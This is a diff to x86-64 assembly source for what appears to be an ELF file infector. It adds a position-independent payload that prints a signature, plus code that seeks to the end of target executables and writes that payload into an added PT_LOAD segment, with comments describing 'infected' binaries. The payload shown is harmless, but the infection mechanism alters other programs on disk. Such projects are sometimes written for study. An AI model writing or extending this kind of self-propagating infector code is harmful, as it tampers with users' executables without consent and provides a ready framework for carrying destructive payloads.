@@ -34,6 +34,35 @@ section .data
     msg_invalid:    db " is not a valid elf64 executable", 10, 0
     msg_add_pt_load: db "add pt_load", 10, 0
 
+; Payload section - this is the ASM code that will be copied to the PT_LOAD segment
+; The payload is position-independent and will execute when the infected binary runs
+payload_start:
+    ; Simple payload that prints the signature and returns
+    ; This is the code that will be injected into the target ELF
+    push rax
+    push rdi
+    push rsi
+    push rdx
+    ; Write signature to stdout
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel signature]
+    mov edx, signature_len
+    syscall
+    ; Write newline
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
+    syscall
+    pop rdx
+    pop rsi
+    pop rdi
+    pop rax
+    ret
+payload_end:
+    payload_size equ payload_end - payload_start
+
 section .text
 global _start
 global list_files_recursive
@@ -606,6 +635,32 @@ add_pt_load:
     mov edi, r13d               ; fd
     lea rsi, [rel elf_phdr_buf]
     syscall
+
+    ; Check if write succeeded
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Now copy the ASM payload code to the newly created PT_LOAD segment
+    ; Seek to the end of the original file (where the new PT_LOAD's p_offset points)
+    mov eax, SYS_LSEEK
+    mov edi, r13d               ; fd
+    mov rsi, [rbp-8]            ; offset = original file size (end of original file)
+    xor edx, edx                ; SEEK_SET = 0
+    syscall
+
+    test rax, rax
+    js .add_pt_load_close_fail
+
+    ; Write the payload code to the file
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel payload_start]  ; pointer to payload code
+    mov edx, payload_size       ; size of payload
+    syscall
+
+    ; Check if write succeeded
+    test rax, rax
+    js .add_pt_load_close_fail
 
     ; Close the file
     mov eax, SYS_CLOSE
